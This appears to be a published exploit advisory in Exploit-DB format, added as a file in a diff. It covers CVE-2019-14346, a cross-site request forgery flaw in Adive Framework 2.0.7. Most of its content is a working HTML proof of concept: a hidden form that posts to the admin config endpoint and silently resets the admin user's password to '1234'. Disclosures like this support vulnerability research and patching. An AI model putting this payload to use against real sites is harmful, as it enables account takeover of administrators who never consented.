@@ -1,0 +1,33 @@
+# Exploit Title: Adive Framework 2.0.7 – Cross-Site Request Forgery (CSRF)
+# Date:02/08/2019.
+# Exploit Author: Pablo Santiago
+# Vendor Homepage: https://adive.es
+# Software Link: https://github.com/ferdinandmartin/adive-php7
+# Version: 2.0.7
+# Tested on: Windows and Kali linux
+# CVE :2019-14346
+
+# 1. Technical Description:
+# Adive Framework 2.0.7 and possibly before are affected by Cross-Site
+#Request Forgery vulnerability, an attacker could change any user
+password.
+
+# 2. Proof Of Concept (CODE):
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/adive/admin/config" method="POST">
+      <input type="hidden" name="userName" value="admin" />
+      <input type="hidden" name="confPermissions" value="1" />
+      <input type="hidden" name="pass" value="1234" />
+      <input type="hidden" name="cpass" value="1234" />
+      <input type="hidden" name="invokeType" value="web" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+# 3. References:
+# https://hackpuntes.com/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/
+# https://imgur.com/apuZa9q
